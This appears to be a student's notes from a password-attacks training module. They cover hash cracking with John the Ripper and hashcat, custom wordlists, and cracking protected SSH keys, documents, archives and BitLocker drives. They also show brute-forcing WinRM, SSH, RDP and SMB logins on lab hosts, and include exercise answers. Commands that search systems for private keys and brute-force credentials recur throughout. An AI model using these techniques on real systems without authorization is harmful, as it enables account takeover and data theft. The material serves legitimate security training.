# Introduction

`Confidentiality`, `integrity`, and `availability` are at the core of every infosec practitioner's responsibilities. Without maintaining a balance among them, we cannot ensure the security of our enterprises. This balance is preserved by auditing and accounting for each file, object, and host in the environment; by validating that users have appropriate permissions (authorization) to access those resources; and by verifying each user's identity (authentication) before granting access. Most breaches can be traced back to the breakdown of one of these three principles.
## Authentication

Authentication, at its core, is the validation of your identity by presenting a combination of four factors to a validation mechanism. They are:

1. `Something you know`: a password, passcode, PIN, passphrase, etc.
2. `Something you have`: an ID card, smart card, trusted device/phone, etc.
3. `Something you are`: biometric characteristics such as fingerprint, face recognition, iris/retina, voice, etc.
4. `Somewhere you are`: geolocation, IP address, etc.
## The use of passwords

The most common and widely used authentication method is still the use of passwords. But what is a password? A password or passphrase can be generally defined as `a combination of letters, numbers, and symbols in a string for identity validation.` For example, if we work with passwords and take a standard 8-digit password that consists only of upper case letters and numbers, we would get a total of `36⁸` (`208,827,064,576`) possible passwords.
# Introduction to Password Cracking

Passwords are commonly `hashed` when stored, in order to provide some protection in the event they fall into the hands of an attacker. `Hashing` is a mathematical function which transforms an arbitrary number of input bytes into a (typically) fixed-size output; common examples of hash functions are `MD5`, and `SHA-256`.

Take the password `Soccer06!` for example. The corresponding `MD5` and `SHA-256` hashes can be generated with the following commands:

```shell
bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

bmdyy@htb:~$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
```

Hash functions are designed to work in `one direction`. This means it should not be possible to figure out what the original password was based on the hash alone. When attackers attempt to do this, it is called `password cracking`. Common techniques are to use `rainbow tables`, to perform `dictionary attacks`, and typically as a last resort, to perform `brute-force attacks`.
## Rainbow tables

Rainbow tables are large pre-compiled maps of input and output values for a given hash function. These can be used to very quickly identify the password if its corresponding hash has already been mapped.

| Password   | MD5 Hash                         |
| ---------- | -------------------------------- |
| 123456     | e10adc3949ba59abbe56e057f20f883e |
| 12345      | 827ccb0eea8a706c4c34a16891f84e7b |
| 123456789  | 25f9e794323b453885f5181f1b624d0b |
| password   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| iloveyou   | f25a2fc72690b780b2a14e140ef6a9e0 |
| princess   | 8afa847f50a716e64932d995c8e7435a |
| 1234567    | fcea920f7412b5da7be0cf42b8c93759 |
| rockyou    | f806fc5a2a0d5ba2471600758452799c |
| 12345678   | 25d55ad283aa400af464c76d713c07ad |
| abc123     | e99a18c428cb38d5f260853678922e03 |
| ...SNIP... | ...SNIP...                       |
Because rainbow tables are such a powerful attack, `salting` is used. A `salt`, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed. To maximize impact, salts should not be reused. 

A salt is not a secret value — when a system goes to check an authentication request, it needs to know what salt was used so that it can check if the password hash matches. For this reason, salts are typically prepended to corresponding hashes. The reason this technique works against rainbow tables is that even if the correct password has been mapped, the combination of salt and password has likely not (especially if the salt contains non-printable characters). To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt. A salt consisting of `just one single byte` would mean the `15 billion` entries from before would have to be `3.84 trillion` (factor of 256).
## Brute-force attack

A `brute-force` attack involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time—especially for long passwords—however shorter passwords (<9 characters) are viable targets, even on consumer hardware. Brute-forcing is the only password cracking technique that is `100% effective` - in that, given enough time, any password will be cracked with this technique.

**Note:** Brute-forcing speeds depend heavily on the hashing algorithm and hardware that is used. On a typical company laptop, a tool like `hashcat` might be able to guess over `five million` passwords per second when attacking MD5, while at the same time only managing `ten thousand` per second when targeting a DCC2 hash.
## Dictionary attack

A `dictionary` attack, otherwise known as a `wordlist` attack, is one of the most `efficient` techniques for cracking passwords, especially when operating under time-constraints as penetration testers usually do. Rather than attempting every possible combination of characters, a list containing statistically likely passwords is used. Well-known wordlists for password cracking are [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) and those included in [SecLists](https://github.com/danielmiessler/SecLists).
## Exercise

### What is the SHA1 hash for `Academy#2025`?
```shell
echo -n Academy#2025 | sha1sum

750fe4b402dc9f91cedf09b652543cd85406be8c
```
# Introduction to John The Ripper

[John the Ripper](https://github.com/openwall/john) (aka. `JtR` aka. `john`) is a well-known penetration testing tool used for cracking passwords through various attacks including brute-force and dictionary. It is open-source software initially developed for UNIX-based systems and was first released in 1996. It has become a staple of the security industry due to its various capabilities. The `"jumbo"` variant is recommended for our uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures.

## Cracking modes

#### Single crack mode

`Single crack mode` is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory name, and [GECOS](https://en.wikipedia.org/wiki/Gecos_field) values (full name, room number, phone number, etc.). These strings are run against a large set of rules that apply common string modifications seen in passwords (e.g. a user whose real name is `Bob Smith` might use `Smith1` as their password).

Based on the contents of the file, it can be inferred that the victim has the username `r0lf`, the real name `Rolf Sebastian`, and the home directory `/home/r0lf`. Single crack mode will use this information to generate candidate passwords and test them against the hash. We can run the attack with the following command:

```shell
john --single passwd
```
#### Wordlist mode

`Wordlist mode` is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax for the command is as follows:

```shell
john --wordlist=<wordlist_file> <hash_file>
```

The wordlist file (or files) used for cracking password hashes must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Rules, either custom or built-in, can be specified by using the `--rules` argument. These can be applied to generate candidate passwords using transformations such as appending numbers, capitalizing letters and adding special characters.
#### Incremental mode

`Incremental mode` is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model ([Markov chains](https://en.wikipedia.org/wiki/Markov_chain)). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.

The basic syntax is:

```shell
john --incremental <hash_file>
```

By default, JtR uses predefined incremental modes specified in its configuration file (`john.conf`), which define character sets and password lengths. You can customize these or define your own to target passwords that use special characters or specific patterns.

```shell
grep '# Incremental modes' -A 100 /etc/john/john.conf
```

**Note:** This mode can be resource-intensive and slow, especially for long or complex passwords. Customizing the character set and length can improve performance and focus the attack.
## Identifying hash formats

Sometimes, password hashes may appear in an unknown format, and even John the Ripper (JtR) may not be able to identify them with complete certainty. For example, consider the following hash:

```shell
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Unfortunately, in our example it is still quite unclear what format the hash is in. This will sometimes be the case, and is simply one of the "problems" you will encounter as a pentester. Many times, the context of where the hash came from will be enough to make an educated case on the format.
## Cracking files

It is also possible to crack password-protected or encrypted files with JtR. Multiple `"2john"` tools come with JtR that can be used to process files and produce hashes compatible with JtR. The generalized syntax for these tools is:

```shell
<tool> <file_to_crack> > file.hash
```

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
## Exercise
### Use single-crack mode to crack r0lf's password.

```bash
# passwd 
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
```
Based on Hashes.com we can get: $6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/ - Possible algorithms: sha512crypt $6$, SHA512 (Unix)

But we just use single 

```shell
john --single passwd
```

NAITSABES
### Use wordlist-mode with rockyou.txt to crack the RIPEMD-128 password.

```shell
john --wordlist='rockyou.txt' -format=ripemd-128 passwd2
```
# Introduction to Hashcat

[Hashcat](https://hashcat.net/) is a well-known password cracking tool for Linux, Windows, and macOS. From 2009 until 2015 it was proprietary software, but has since been released as open-source. Featuring fantastic GPU support, it can be used to crack a large variety of hashes. Similar to JtR, hashcat supports multiple attack (cracking) modes which can be used to efficiently attack password hashes.

- `-a` is used to specify the `attack mode`
- `-m` is used to specify the `hash type`
- `<hashes>` is a either a hash string, or a file containing one or more password hashes of the same type
- `[wordlist, rule, mask, ...]` is a placeholder for additional arguments that depend on the attack mode
## Hash types

Hashcat supports hundreds of different hash types, each of which is assigned a ID. A list of associated IDs can be generated by running `hashcat --help`.

## Attack modes

Hashcat has many different attack mode, including `dictionary`, `mask`, `combinator`, and `association`. In this section we will go over the first two, as they are likely the most common ones that you will need to use.

#### Dictionary attack

[Dictionary attack](https://hashcat.net/wiki/doku.php?id=dictionary_attack) (`-a 0`) is, as the name suggests, a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as a potential password until the correct one is found or the list is exhausted.

A wordlist alone is often not enough to crack a password hash. As was the case with JtR, `rules` can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under `/usr/share/hashcat/rules`

#### Mask attack

[Mask attack](https://hashcat.net/wiki/doku.php?id=mask_attack) (`-a 3`) is a type of brute-force attack in which the keyspace is explicitly defined by the user. For example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.

A mask is defined by combining a sequence of symbols, each representing a built-in or custom character set. Hashcat includes several built-in character sets:

| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |
### Use a dictionary attack to crack the first password hash. (Hash: e3e3ec5831ad5e7288241960e5d4fdb8)

```shell
hashcat -m 0 hash1 /usr/share/wordlists/rockyou.txt
```
### Use a dictionary attack with rules to crack the second password hash. (Hash: 1b0556a75770563578569ae21392630c)

```shell
hashcat -m 0 hash2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### Use a mask attack to crack the third password hash. (Hash: 1e293d6912d074c0fd15844d803400dd)

```shell
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```
# Writing Custom Wordlists and Rules

Many users create their passwords based on `simplicity rather than security`. To mitigate this human tendency (which often undermines security measures), password policies can be implemented on systems to enforce specific password requirements. For instance, a system might enforce the inclusion of uppercase letters, special characters, and numbers. Most password policies mandate a minimum length—typically eight characters—and require at least one character from each specified category.

We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations. The complete syntax is documented in the official [Hashcat rule-based attack documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack), but the examples below are sufficient to understand how Hashcat mutates input words.

|**Function**|**Description**|
|---|---|
|`:`|Do nothing|
|`l`|Lowercase all letters|
|`u`|Uppercase all letters|
|`c`|Capitalize the first letter and lowercase others|
|`sXY`|Replace all instances of X with Y|
|`$!`|Add the exclamation character at the end|
Each rule is written on a new line and determines how a given word should be transformed. If we write the functions shown above into a file, it may look like this:

```shell
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

We can use the following command to apply the rules in `custom.rule` to each word in `password.list` and store the mutated results in `mut_password.list`.

```shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

In this case, the single input word will produce fifteen mutated variants.
## Generating wordlists using CeWL

We can use a tool called [CeWL](https://github.com/digininja/CeWL) to scan potential words from a company's website and save them in a separate list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee. We specify some parameters, like the depth to spider (`-d`), the minimum length of the word (`-m`), the storage of the found words in lowercase (`--lowercase`), as well as the file where we want to store the results (`-w`).

```shell
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```
## Exercise

For this sections exercise, imagine that we compromised the password hash of a `work email` belonging to `Mark White`. After performing a bit of OSINT, we have gathered the following information about Mark:

- He was born on `August 5, 1998`
- He works at `Nexura, Ltd.`
    - The company's password policy requires passwords to be at least 12 characters long, to contain at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number
- He lives in `San Francisco, CA, USA`
- He has a pet cat named `Bella`
- He has a wife named `Maria`
- He has a son named `Alex`
- He is a big fan of `baseball`

The password hash is: `97268a8ae45ac7d15c3cea4ce6ea550b`. Use the techniques covered in this section to generate a custom wordlist and ruleset targeting Mark specifically, and crack the password.
### What is Mark's password?

Create `mark.txt`

```shell
Mark
White
Nexura
SanFrancisco
Bella
Maria
Alex
baseball
1998
0805
080598
05081998
1998
```

Then, I created a wordlist with combinations and applying a rule according what the text said

`policy.rule` content:

```shell
$!
$#
$@
c $!
c $#
c $@
```

```shell
hashcat -m 0 hash.txt dict.txt -r policy.rule --stdout > final_wordlist.txt
```
 
 We get the Password `Baseball1998!`
# Cracking Protected Files

The use of file encryption is often neglected in both `private` and `professional` contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the [General Data Protection Regulation (GDPR)](https://gdpr-info.eu/) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss `confidential` topics or transmit `sensitive` data via email, which may be intercepted by attackers positioned to exploit these communication channels.

## Hunting for Encrypted Files

Many different extensions correspond to encrypted files—a useful reference list can be found on [FileInfo](https://fileinfo.com/filetypes/encoded). As an example, consider this command we might use to locate commonly encrypted files on a Linux system:

```shell
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
## Hunting for SSH keys

Certain files, such as SSH keys, do not have standard file extension. In cases like these, it may be possible to identify files by standard content such as header and footer values. For example, SSH private keys always begin with `-----BEGIN [...SNIP...] PRIVATE KEY-----`. We can use tools like `grep` to recursively search the file system for them during post-exploitation.

```shell
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

Some SSH keys are encrypted with a passphrase. With older PEM formats, it was possible to tell if an SSH key is encrypted based on the header, which contains the encryption method in use. Modern SSH keys, however, appear the same whether encrypted or not.
## Cracking encrypted SSH keys

As mentioned in a previous section, JtR has many different scripts for extracting hashes from files—which we can then proceed to crack. We can find these scripts on our system using the following command:

```shell
locate *2john*
```

For example, we could use the Python script `ssh2john.py` to acquire the corresponding hash for an encrypted SSH key, and then use JtR to try and crack it.

```shell
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

We can then view the resulting hash:

```shell
john ssh.hash --show
```
## Cracking password-protected documents

Over the course of our careers, we are likely to encounter a wide variety of documents that are password-protected to restrict access to authorized individuals.

Today, most reports, documentation, and information sheets are commonly distributed as Microsoft Office documents or PDFs. John the Ripper (JtR) includes a Python script called `office2john.py`, which can be used to extract password hashes from all common Office document formats. These hashes can then be supplied to JtR or Hashcat for offline cracking. The cracking procedure remains consistent with other hash types.

```shell
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
```

The process for cracking PDF files is quite similar, as we simply swap out `office2john.py` for `pdf2john.py`.

```shell
df2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
```
## Exercise
### Download the attached ZIP archive (cracking-protected-files.zip), and crack the file within. What is the password?

```shell
office2john Confidential.xlsx > xlsx.hash 
john --wordlist=/usr/share/wordlists/rockyou.txt xlsx.hash
john xlsx.hash --show
```
# Cracking Protected Archives

Besides standalone files, we will often run across `archives` and `compressed files`—such as ZIP files—which are protected with a password.

Let us assume the role of an employee at an administrative company and imagine that a client requests a summary of an analysis in various formats, such as Excel, PDF, Word, and a corresponding presentation. One approach would be to send these files individually. However, if we extend this scenario to a large organization managing multiple simultaneous projects, this method of file transfer can become cumbersome and may result in individual files being misplaced. In such cases, employees often rely on archive files, which allow them to organize necessary documents in a structured manner (typically using subfolders) before compressing them into a single, consolidated file.

There are many types of archive files. Some of the more commonly encountered file extensions include `tar`, `gz`, `rar`, `zip`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `7z`, and `gzip`.

A comprehensive list of archive file types can be found on [FileInfo](https://fileinfo.com/filetypes/compressed). Rather than typing them out manually, we can also query the data using a one-liner, apply filters as needed, and save the results to a file. At the time of writing, the website lists `365` archive file types.

```shell
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```
## Cracking ZIP files

The `ZIP` format is often heavily used in Windows environments to compress many files into one file. The process of cracking an encrypted ZIP file is similar to what we have seen already, except for using a different script to extract the hashes.

```shell
zip2john ZIP.zip > zip.hash
cat zip.hash
john --wordlist=rockyou.txt zip.hash
```
## Cracking OpenSSL encrypted GZIP files

It is not always immediately apparent whether a file is password-protected, particularly when the file extension corresponds to a format that does not natively support password protection. As previously discussed, `openssl` can be used to encrypt files in the `GZIP` format. To determine the actual format of a file, we can use the `file` command, which provides detailed information about its contents. For example:

```shell
file GZIP.gzip

# The HASH could be salted
```

When cracking OpenSSL encrypted files, we may encounter various challenges, including numerous false positives or complete failure to identify the correct password. To mitigate this, a more reliable approach is to use the `openssl` tool within a `for` loop that attempts to extract the contents directly, succeeding only if the correct password is found.

The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.

```shell
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```
## Cracking BitLocker-encrypted drives

[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-device-encryption-overview-windows-10) is a full-disk encryption feature developed by Microsoft for the Windows operating system. Available since Windows Vista, it uses the `AES` encryption algorithm with either 128-bit or 256-bit key lengths. If the password or PIN used for BitLocker is forgotten, decryption can still be performed using a recovery key—a 48-digit string generated during the setup process.

In enterprise environments, virtual drives are sometimes used to store personal information, documents, or notes on company-issued devices to prevent unauthorized access. To crack a BitLocker encrypted drive, we can use a script called `bitlocker2john` to [four different hashes](https://openwall.info/wiki/john/OpenCL-BitLocker): the first two correspond to the BitLocker password, while the latter two represent the recovery key. Because the recovery key is very long and randomly generated, it is generally not practical to guess—unless partial knowledge is available. Therefore, we will focus on cracking the password using the first hash (`$bitlocker$0$...`).

```shell
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
```

Once a hash is generated, either `JtR` or `hashcat` can be used to crack it. For this example, we will look at the procedure with `hashcat`. The hashcat mode associated with the `$bitlocker$0$...` hash is `-m 22100`. We supply the hash, specify the wordlist, and define the hash mode. Since this encryption uses strong AES encryption, cracking may take considerable time depending on hardware performance.

```shell
hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
```
After successfully cracking the password, we can access the encrypted drive.
#### Mounting BitLocker-encrypted drives in Windows

The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the `.vhd` file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.
#### Mounting BitLocker-encrypted drives in Linux (or macOS)

It is also possible to mount BitLocker-encrypted drives in Linux (or macOS). To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker). First, we need to install the package using `apt`:

```shell
sudo apt-get install dislocker
```

Next, we create two folders which we will use to mount the VHD.

```shell
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

We then use `losetup` to configure the VHD as [loop device](https://en.wikipedia.org/wiki/Loop_device), decrypt the drive using `dislocker`, and finally mount the decrypted volume:

```shell
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

If everything was done correctly, we can now browse the files:

```shell
cd /media/bitlockermount/
ls -la
```

Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:

```shell
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```

```shell
bitlocker2john -i Private.vhd > bitlocker.hashes 
grep "bitlocker\$0" bitlocker.hashes > bitlocker.hash
ohn bitlocker.hash --wordlist=/usr/share/wordlists/rockyou.txt
# francisco is the password
```

Now we go to our Windows Machine and mount the vhd and enter with the password `francisco`. We get the flag.txt.
# Network Services

During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`.

Let us imagine that we want to manage a Windows server over the network. Accordingly, we need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal. In this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`. SSH is not as common on Windows, but it is the leading service for Linux-based systems.

All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.
## WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

For security reasons, WinRM must be activated and configured manually in Windows 10/11. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. By default, WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).
#### NetExec

#### Installing NetExec

We can install `NetExec` with `apt`, or clone the [GitHub repo](https://github.com/Pennyw0rth/NetExec) and follow the various [installation](https://www.netexec.wiki/getting-started/installation) methods, such as installing from source and avoiding dependency issues.

```shell
sudo apt-get -y install netexec
```
#### NetExec Menu Options

Running the tool with the `-h` flag will show us general usage instructions and some options available to us.

```shell
netexec -h
```
#### NetExec Protocol-Specific Help

Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.

```shell
netexec smb -h
```
#### NetExec Usage

The general format for using NetExec is as follows:

```shell
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

As an example, this is what attacking a WinRM endpoint might look like:

```shell
netexec winrm 10.129.42.197 -u user.list -p password.list
```

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.
#### Evil-WinRM

#### Installing Evil-WinRM

```shell
sudo gem install evil-winrm
```
#### Evil-WinRM Usage

```shell
evil-winrm -i <target-IP> -u <username> -p <password>
```

```shell
evil-winrm -i 10.129.42.197 -u user -p password
```
## SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.
#### Hashing

The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

#### Hydra - SSH

We can use a tool like `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.

```shell
hydra -L user.list -P password.list ssh://10.129.42.197
```

To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.
## Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.
#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.

```shell
hydra -L user.list -P password.list rdp://10.129.42.197
```

Linux offers different clients to communicate with the desired server using the RDP protocol. These include [Remmina](https://remmina.org/), [xfreerdp](https://linux.die.net/man/1/xfreerdp), and many others. For our purposes, we will work with xfreerdp.

and then:
```shell
xfreerdp /v:10.129.42.197 /u:user /p:password
```
## SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

```shell
hydra -L user.list -P password.list smb://10.129.42.197
```

However, we may also get the following error describing that the server has sent an invalid reply.

```shell
hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).
#### Metasploit Framework

Now we can use `NetExec` again to view the available shares and what privileges we have for them.

```shell
# In Metasploit
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
#### Smbclient

```shell
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
## Exercise
### Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```shell
# I tried with 
netexec winrm 10.129.202.136 -u username.list -p password.list
## But it took so much time. So, in pararell I got access via SSH and gathered all the valid accounts and create my own username list
# Finally, I tried with
netexec winrm 10.129.202.136 -u 2.list -p password.list # where 2.list is my custom username list
---
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\cassie:november
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\chris:november
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\dennis:november
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\jerome:november
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

```
evil-winrm -i 10.129.202.136 -u john -p november
```
### Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```shell
hydra -L username.list -P password.list ssh://10.129.202.136
```
### Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```shell
hydra -L username.list -P password.list rdp://10.129.202.136

xfreerdp /v:10.129.202.136 /u:chris /dynamic-resolution /p:789456123
```
